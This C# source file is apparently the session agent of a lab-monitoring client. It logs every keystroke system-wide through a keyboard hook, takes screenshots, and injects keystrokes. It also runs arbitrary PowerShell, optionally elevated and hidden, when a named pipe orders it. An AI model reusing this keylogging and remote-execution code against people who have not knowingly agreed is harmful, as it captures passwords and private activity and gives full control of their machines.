using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using LabLock.Client.Helpers;
using Microsoft.Extensions.Logging;

namespace LabLock.Client.Services;

public static class SessionAgentWorker
{
    private const int KeystrokeFlushMs = 3000;

    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
        PropertyNameCaseInsensitive = true,
        WriteIndented = false
    };

    private static IntPtr _hookId;
    private static NativeMethods.LowLevelKeyboardProc _hookProc = null!;
    private static readonly StringBuilder KeyBuffer = new();
    private static string _currentWindow = "";
    private static string _currentProcess = "";
    private static readonly List<object> KeyBatch = new();
    private static IntPtr _pipeHandle = IntPtr.Zero;
    private static readonly byte[] ReadBuf = new byte[2 * 1024 * 1024]; // 2MB
    private static readonly object PipeWriteLock = new();

    public static void Run(string? pipeName = null)
    {
        pipeName ??= $"\\\\.\\pipe\\LabLockSessionAgent-{Environment.UserName}";

        try
        {
        _pipeHandle = ConnectPipe(pipeName);
        Log("Connected to pipe, sending ready");
        SendPipe(new { type = "ready" });
        Log("Ready sent, starting hook");
        }
        catch (Exception ex)
        {
            Log($"Pipe connect failed: {ex.Message}");
            return;
        }

        _hookProc = HookCallback;
        _hookId = NativeMethods.SetWindowsHookEx(
            NativeMethods.WH_KEYBOARD_LL, _hookProc,
            NativeMethods.GetModuleHandle(Process.GetCurrentProcess().MainModule!.ModuleName), 0);

        var flushTimer = new System.Timers.Timer(KeystrokeFlushMs) { AutoReset = true };
        flushTimer.Elapsed += (_, _) => FlushKeystrokes();
        flushTimer.Start();

        var readThread = new Thread(() =>
        {
            Log("Read thread started");
            while (true)
            {
                try
                {
                    if (!NativeMethods.ReadFile(_pipeHandle, ReadBuf, (uint)ReadBuf.Length, out var bytesRead, IntPtr.Zero))
                    {
                        Log($"ReadFile returned FALSE, err={Marshal.GetLastWin32Error()}. Exiting read loop.");
                        break;
                    }

                    if (bytesRead == 0) continue;

                    var json = Encoding.UTF8.GetString(ReadBuf, 0, (int)bytesRead);
                    var dispatchJson = json.Trim();
                    try { Log($"Dispatch: {dispatchJson.Substring(0, Math.Min(200, dispatchJson.Length))}"); }
                    catch { }

                    try
                    {
                        var response = Dispatch(json);
                        SendPipe(response);
                    }
                    catch (Exception ex)
                    {
                        var errId = "";
                        try { using var doc = JsonDocument.Parse(json); errId = doc.RootElement.GetProperty("id").GetString() ?? ""; }
                        catch { }
                        try { SendPipe(new { type = "response", id = errId, success = false, error = ex.Message }); }
                        catch { }
                    }
                }
                catch (Exception ex)
                {
                    Log($"Read thread exception: {ex.GetType().Name}: {ex.Message}. Exiting.");
                    break;
                }
            }
        })
        { IsBackground = true };
        readThread.Start();

        while (NativeMethods.GetMessage(out var msg, IntPtr.Zero, 0, 0))
        {
            NativeMethods.TranslateMessage(ref msg);
            NativeMethods.DispatchMessage(ref msg);
        }

        NativeMethods.UnhookWindowsHookEx(_hookId);
        flushTimer.Stop();
        FlushKeystrokes();
        readThread.Interrupt();
    }

    private static object Dispatch(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var id = root.GetProperty("id").GetString() ?? "";
            var action = root.GetProperty("action").GetString() ?? "";
            var paramsEl = root.TryGetProperty("params", out var p) ? p : default;

            object result = action switch
            {
                "screenshot" => TakeScreenshot(),
                "get_active_app" => GetActiveApp(),
                "message_box" => ShowMessageBox(paramsEl),
                "interactive_message" => ShowInteractiveMessage(paramsEl),
                "block_screen" => BlockScreen(paramsEl),
                "kill_tasks" => KillTasks(paramsEl),
                "send_keystrokes" => SendKeystrokes(paramsEl),
                "run_powershell" => RunPowerShell(paramsEl),
                "ping" => new { pong = true },
                _ => throw new Exception($"Unknown action: {action}")
            };

            return new { type = "response", id, success = true, data = result };
        }
        catch (Exception ex)
        {
            var id = "";
            try { using var doc = JsonDocument.Parse(json); id = doc.RootElement.GetProperty("id").GetString() ?? ""; }
            catch { }

            return new { type = "response", id, success = false, error = ex.Message };
        }
    }

    private static object TakeScreenshot()
    {
        object? result = null;
        Exception? error = null;
        var done = new ManualResetEventSlim();

        ThreadPool.QueueUserWorkItem(_ =>
        {
            try
            {
                var screen = Screen.PrimaryScreen;
                if (screen == null) throw new Exception("No primary screen");

                var bounds = screen.Bounds;
                using var bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                using var g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);

                using var ms = new MemoryStream();
                bitmap.Save(ms, ImageFormat.Jpeg);
                result = new { imageBase64 = Convert.ToBase64String(ms.ToArray()), width = bounds.Width, height = bounds.Height, format = "jpeg" };
            }
            catch (Exception ex) { error = ex; }
            finally { done.Set(); }
        });

        if (!done.Wait(TimeSpan.FromSeconds(20)))
            throw new TimeoutException("Screenshot timed out after 20s");

        if (error != null) throw error;
        return result!;
    }

    private static object GetActiveApp()
    {
        var hwnd = NativeMethods.GetForegroundWindow();
        var sb = new StringBuilder(512);
        NativeMethods.GetWindowText(hwnd, sb, sb.Capacity);
        NativeMethods.GetWindowThreadProcessId(hwnd, out var pid);
        var procName = "";
        try { procName = Process.GetProcessById((int)pid).ProcessName; }
        catch { }

        return new { title = sb.ToString(), processName = procName, windowHandle = hwnd.ToInt64() };
    }

    private static object ShowMessageBox(JsonElement args)
    {
        var title = GetStr(args, "title") ?? "";
        var message = GetStr(args, "message") ?? "No message";
        var buttons = GetStr(args, "buttons") ?? "OK";
        var icon = GetStr(args, "icon") ?? "Information";
        var topMost = GetBool(args, "topMost") || true;

        string? clicked = null;
        var done = new ManualResetEventSlim();

        var thread = new Thread(() =>
        {
            var dialog = new ModernMessageDialog(title, message, buttons, icon, topMost);
            dialog.ResultReady += (_, r) => { clicked = r; done.Set(); };
            dialog.Show();
            Application.Run(dialog);
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        done.Wait(TimeSpan.FromMinutes(5));
        if (!done.IsSet) thread.Interrupt();

        return new { clicked = clicked ?? "closed" };
    }

    private static object ShowInteractiveMessage(JsonElement args)
    {
        var title = GetStr(args, "title") ?? "";
        var message = GetStr(args, "message") ?? "";
        var placeholder = GetStr(args, "placeholder") ?? "Type your reply...";
        var allowEmpty = GetBool(args, "allowEmpty");
        var windowTopMost = GetBool(args, "topMost") || true;

        string? reply = null;
        var done = new ManualResetEventSlim();

        var thread = new Thread(() =>
        {
            var dialog = new ModernInputDialog(title, message, placeholder, allowEmpty, windowTopMost);
            dialog.ResultReady += (_, r) => { reply = r; dialog.Close(); done.Set(); };
            dialog.Show();
            dialog.Activate();
            Application.Run(dialog);
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        done.Wait(TimeSpan.FromMinutes(5));
        if (!done.IsSet) thread.Interrupt();

        return new { reply = reply ?? "", cancelled = reply == null };
    }

    private static object BlockScreen(JsonElement args)
    {
        var enable = GetBool(args, "enable");
        if (enable)
        {
            BlockScreenInstance.Show();
            return new { blocked = true };
        }
        else
        {
            BlockScreenInstance.Close();
            return new { blocked = false };
        }
    }

    private static object KillTasks(JsonElement args)
    {
        var names = new List<string>();
        if (args.TryGetProperty("processNames", out var arr))
        {
            foreach (var el in arr.EnumerateArray())
                names.Add(el.GetString() ?? "");
        }

        var results = new List<object>();
        foreach (var name in names)
        {
            try
            {
                var procs = Process.GetProcessesByName(name);
                foreach (var p in procs)
                {
                    try { p.Kill(); p.WaitForExit(3000); results.Add(new { process = name, pid = p.Id, status = "killed" }); }
                    catch (Exception ex) { results.Add(new { process = name, pid = p.Id, status = "failed", error = ex.Message }); }
                }
                if (procs.Length == 0) results.Add(new { process = name, pid = 0, status = "not_running" });
            }
            catch (Exception ex)
            {
                results.Add(new { process = name, status = "error", error = ex.Message });
            }
        }

        return new { results };
    }

    private static object SendKeystrokes(JsonElement args)
    {
        var keys = GetStr(args, "keys") ?? "";
        NativeMethods.BlockInput(true);
        try
        {
            SendKeys.SendWait(keys);
        }
        finally
        {
            NativeMethods.BlockInput(false);
        }
        return new { sent = keys };
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && ((int)wParam == 0x0100 || (int)wParam == 0x0104))
        {
            var hookStruct = Marshal.PtrToStructure<NativeMethods.KBDLLHOOKSTRUCT>(lParam);
            var key = MapKey(hookStruct.vkCode);
            GetForegroundInfo(out var window, out var process);

            if (window != _currentWindow) FlushKeystrokes();

            _currentWindow = window;
            _currentProcess = process;
            KeyBuffer.Append(key);

            if (KeyBuffer.Length > 200) FlushKeystrokes();
        }
        return NativeMethods.CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    private static string MapKey(uint vkCode)
    {
        if (vkCode == 8) return "[BS]";
        if (vkCode == 9) return "[TAB]";
        if (vkCode == 13) return "[ENTER]";
        if (vkCode == 27) return "[ESC]";
        if (vkCode == 32) return " ";
        if (vkCode == 46) return "[DEL]";
        if (vkCode == 160 || vkCode == 161) return "[SHIFT]";
        if (vkCode == 162 || vkCode == 163) return "[CTRL]";
        if (vkCode == 164 || vkCode == 165) return "[ALT]";
        if (vkCode == 91 || vkCode == 92) return "[WIN]";
        if (vkCode == 20) return "[CAPS]";
        if (vkCode >= 37 && vkCode <= 40) return new[] { "[LEFT]", "[UP]", "[RIGHT]", "[DOWN]" }[vkCode - 37];
        if (vkCode >= 112 && vkCode <= 123) return $"[F{vkCode - 111}]";

        try
        {
            var sb = new StringBuilder(8);
            var sc = NativeMethods.MapVirtualKey(vkCode, 0);
            var kb = new byte[256];
            int ret = ToUnicode(vkCode, sc, kb, sb, sb.Capacity, 0);
            return ret > 0 ? sb.ToString() : $"[{vkCode}]";
        }
        catch
        {
            return $"[{vkCode}]";
        }
    }

    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    private static void GetForegroundInfo(out string window, out string process)
    {
        window = "";
        process = "";
        try
        {
            var hwnd = NativeMethods.GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return;
            var sb = new StringBuilder(512);
            NativeMethods.GetWindowText(hwnd, sb, sb.Capacity);
            window = sb.ToString();
            NativeMethods.GetWindowThreadProcessId(hwnd, out var pid);
            try { process = Process.GetProcessById((int)pid).ProcessName; } catch { }
        }
        catch { }
    }

    private static void FlushKeystrokes()
    {
        if (KeyBuffer.Length == 0) return;

        KeyBatch.Add(new
        {
            keys = KeyBuffer.ToString(),
            window = _currentWindow,
            process = _currentProcess,
            timestamp = DateTime.UtcNow.ToString("O")
        });
        KeyBuffer.Clear();

        if (KeyBatch.Count >= 10 || KeyBuffer.Length == 0)
        {
            try
            {
                SendPipe(new { type = "keystrokes", data = KeyBatch.ToArray() });
                KeyBatch.Clear();
            }
            catch { }
        }
    }

    private static IntPtr ConnectPipe(string pipeName)
    {
        int lastErr = 0;
        for (int i = 0; i < 30; i++)
        {
            var handle = NativeMethods.CreateFile(pipeName, NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
                0, IntPtr.Zero, NativeMethods.OPEN_EXISTING, 0, IntPtr.Zero);
            if (handle != IntPtr.Zero && handle.ToInt64() != -1) return handle;
            lastErr = Marshal.GetLastWin32Error();
            Thread.Sleep(1000);
        }
        throw new Exception($"Cannot connect to pipe: {pipeName} (win32err={lastErr})");
    }

    private static void SendPipe(object obj)
    {
        var json = JsonSerializer.Serialize(obj, JsonOpts) + "\n";
        var bytes = Encoding.UTF8.GetBytes(json);
        lock (PipeWriteLock)
        {
            if (!NativeMethods.WriteFile(_pipeHandle, bytes, (uint)bytes.Length, out _, IntPtr.Zero))
                throw new Exception($"Pipe write failed: {Marshal.GetLastWin32Error()}");
        }
    }

    private static object RunPowerShell(JsonElement args)
    {
        var command = GetStr(args, "command") ?? "";
        var elevated = GetBool(args, "elevated");
        var timeoutSec = args.TryGetProperty("timeoutSeconds", out var ts) && ts.TryGetInt32(out var t) ? t : 60;

        if (string.IsNullOrEmpty(command))
            throw new Exception("command is required");

        if (elevated)
            return RunElevatedPs(command, timeoutSec);

        return RunUserPs(command, timeoutSec);
    }

    private static object RunUserPs(string command, int timeoutSec)
    {
        var psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -NonInteractive -Command \"{command.Replace("\"", "\\\"")}\"")
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
            LoadUserProfile = true
        };

        using var proc = Process.Start(psi);
        if (proc == null) throw new Exception("Failed to start powershell");

        var stdout = new StringBuilder();
        var stderr = new StringBuilder();
        proc.OutputDataReceived += (_, e) => { if (e.Data != null) stdout.AppendLine(e.Data); };
        proc.ErrorDataReceived += (_, e) => { if (e.Data != null) stderr.AppendLine(e.Data); };
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();

        if (!proc.WaitForExit(timeoutSec * 1000))
        {
            try { proc.Kill(true); } catch { }
            throw new Exception("Command timed out");
        }

        proc.WaitForExit();

        return new
        {
            output = stdout.ToString(),
            error = stderr.ToString(),
            exitCode = proc.ExitCode,
            elevated = false
        };
    }

    private static object RunElevatedPs(string command, int timeoutSec)
    {
        var psi = new ProcessStartInfo("powershell.exe",
            $"-NoProfile -Command \"{command.Replace("\"", "\\\"")}\"")
        {
            UseShellExecute = true,
            Verb = "runas",
            WindowStyle = ProcessWindowStyle.Hidden,
            LoadUserProfile = true
        };

        try
        {
            using var proc = Process.Start(psi);
            if (proc == null) return new { output = "", exitCode = -1, elevated = true, error = "Failed to start elevated powershell (UAC may have been declined)" };

            if (!proc.WaitForExit(timeoutSec * 1000))
            {
                try { proc.Kill(true); } catch { }
                return new { output = "", exitCode = -1, elevated = true, error = "Elevated command timed out" };
            }

            return new
            {
                output = "",
                exitCode = proc.ExitCode,
                elevated = true,
                error = ""
            };
        }
        catch (Exception ex)
        {
            return new
            {
                output = "",
                exitCode = -1,
                elevated = true,
                error = $"Failed to start elevated powershell: {ex.Message}"
            };
        }
    }

    private static string? GetStr(JsonElement el, string key) =>
        el.ValueKind != JsonValueKind.Undefined && el.TryGetProperty(key, out var v) && v.ValueKind == JsonValueKind.String ? v.GetString() : null;

    private static bool GetBool(JsonElement el, string key) =>
        el.ValueKind != JsonValueKind.Undefined && el.TryGetProperty(key, out var v) && v.ValueKind == JsonValueKind.True;

    private static void Log(string msg) { try { File.AppendAllText(Path.Combine(Path.GetTempPath(), "lablock-agent.log"), $"[{DateTime.UtcNow:O}] {msg}\n"); } catch { } }
}

internal static class BlockScreenInstance
{
    private static Form? _form;
    private static readonly object Lock = new();

    public static void Show()
    {
        lock (Lock)
        {
            if (_form != null) return;
            _closeRequested = false;
            var thread = new Thread(() =>
            {
                var form = new Form
                {
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    ShowInTaskbar = false,
                    BackColor = Color.Black,
                    ControlBox = false
                };
                var label = new Label
                {
                    Text = "Screen locked by administrator",
                    ForeColor = Color.White,
                    Font = new Font("Arial", 24, FontStyle.Bold),
                    AutoSize = true
                };
                label.Location = new Point(
                    (Screen.PrimaryScreen!.Bounds.Width - 400) / 2,
                    (Screen.PrimaryScreen.Bounds.Height - 50) / 2);
                form.Controls.Add(label);
                lock (Lock)
                {
                    _form = form;
                    if (_closeRequested)
                    {
                        _form = null;
                        form.Dispose();
                        return;
                    }
                }
                form.Show();
                Application.Run(form);
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }

    public static void Close()
    {
        lock (Lock)
        {
            _closeRequested = true;
            if (_form == null) return;
            var form = _form;
            _form = null;
            form.BeginInvoke(() => { form.Close(); Application.ExitThread(); });
        }
    }

    private static bool _closeRequested;
}
